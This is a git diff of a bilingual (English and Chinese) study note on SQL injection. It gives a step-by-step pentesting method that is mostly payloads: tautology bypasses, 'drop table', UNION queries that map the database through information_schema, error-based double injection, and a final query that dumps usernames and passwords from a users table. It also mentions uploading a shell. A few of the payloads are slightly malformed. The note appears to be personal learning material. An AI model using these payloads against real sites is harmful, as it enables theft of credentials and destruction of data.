@@ -5,7 +5,7 @@ SQL is a famous database engine which is used with web server. In this situation
 ### Basic injection  
 select password from users where name = '$id';  
 So, what can we insert into $id?  
-```  
+```sql  
 5566 or 1=1 --  
 5566; drop table hello  // execute drop table on second line  
 
@@ -17,33 +17,33 @@ rafael' or ''='    // select password from users where name = 'rafael' or ''='';
 Try on terminal what will **SELECT name, password FROM users WHERE id = 1 UNION SELECT 1, 2** happen?  
 Ans: The union result will show as second result with matching column of name and password!  
 Therefore, if we just want the info we need, we can make the first clause not exist...  
-```
+```sql
 select name, password from users where id = 1 and 1 = 0 union select 1, 2;  
 ```
-```
+```sql
 // 秀出當前的庫名,使用者
 select name, password from users where id = 1 and 1 = 0 union select database(), system_user();
 ```
-```  
+```sql  
 // 可以得到目前資料庫下的表名,欄位名  
 ... union select column_name, table_name from information_schema.columns where table_schema=database(); 
 ```
-```
+```sql
 // 也可以得到其他資料庫的名字!  
 ... union select table_schema, table_name from information_schema.columns;  
 // 我的 k朋友說: 尋找 資料庫就應該用schemata, 回傳才不會重複而且有效率
 ... union select group_concat(schema_name) from information_schema.schemata;  // group_concat會將結果合併成一行,我們甚至不需要limit
 ```
-```
+```sql
 // 可以得到所有table和column的名字 
 ... union select table_name, column_name from information_schema.columns;
 ```
-```
+```sql
 // 回傳的結果太多 , 我們可以用 limit加以限制
 // 網頁常常只能show唯一的結果
 ... union select table_name, column_name from information_schema.columns limit 1, 1;  
 ```  
-```  
+```sql  
 // 在做union select時如何知道columns的數量  
 ? id =' or 1=1 order by N--+    // N一筆一筆增加直到頁面無法正確顯示, --+註解掉後面的條件, +是代表註解後面要有空白!
 ```
@@ -54,16 +54,33 @@ select name, password from users where id = 1 and 1 = 0 union select database(),
 When we cannot show results what we want, we still can find whether it exists or not.  
 **True**: Web page shows normal.  
 **False**: Web page shows error or blank.  
-```  
+```sql  
 ... exists (select * from table);  // 配合 AND使用
 ```
 
 ### Time based  
 Wait for my first time practice ><...
   
-### Error based  
-Show the result in error message!  
-Wait for my first time practice ><... 
+### Error based  
+* Analyze the error message  
+```sql
+My payload: ?id = 2'
+Error: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''2'') LIMIT 0,1' at line 1
+```
+看到**near**和**at**的字眼，我們可以刪除左右的單引號，剩下的sql語句應是: ```'  2'  ') LIMIT 0,1```  
+因此，注入語句應該是: ```') or 1=1--+```  
+* Double injection 
+```sql
+/**
+we need:
+count()
+concat()
+floor(), rand()
+group by
+**/
+?id = 1' union select count(*),1,concat((select database()),'~',floor(rand()*2))as a from information_schema.schemata group by a--+
+```
+The result will also show luckly XD.
   
 ### WAF bypass
 WAF is a defender for web.  
@@ -84,41 +101,40 @@ Based on the provilege of db user, we can upload shell to read or write to db. �
 ### Trick of Pentesting  
 Here are some tricks of pentesting, step by step from find the vulnerability to exploit it!  
 1. SQL vulnerability? injection point?  
+```sql
+1' or 1"
 ```
-1' or 1=1--+  
-1' and 1=2--+  // sql error message or page show error?
-```
-這裡, 我們要判斷出sql漏洞的存在與否  
+這裡, 我們要判斷出sql漏洞的存在與否, 並且從error message判斷原生語句 
 
 2. Number of columns   
-```
+```sql
 1' order by N--+   // 不斷增加N的數量, 直到頁面顯示錯誤
 ```
 這裡我們就可以確認query的字段數, union select用起來也比較方便  
 
 3. Where are the SNAKES we want?  
-```
+```sql
 1' and 1=2 union select 1,2,...N--+   // 加以確認我們注入的東西會出現在哪裡
 ```  
 
 4. First, we need to know some basic information...   
-```
+```sql
 ...union select user(),database(),version(), @@version_compile_os--+  // 後面兩個分別是資料庫版本以及作業系統版本
 ```  
 
 5. Start the exciting part...  
-```
+```sql
 ...union select 1,2,...,group_concat(schema_name) from information_schema.schemata--+  // get all database name
 ```  
-```
+```sql
 ...union select 1,2,...,group_concat(table_name) from information_schema.tables where table_schema='FUCK'+--+  
 // FUCK那邊也可以用hex表示
 ```
-```
+```sql
 ...union select 1,2,...,group_concat(column_name) from information_schema.columns where table_name='users'+--+
 // 這邊還是比較喜歡用table_schema,如果懶得決定要鎖定哪張表XD...
 ```
-```
+```sql
 // 最終目的
 1' and 1=2 union 1,2,...,group_concat(username,password) from users+--+  
 ```  
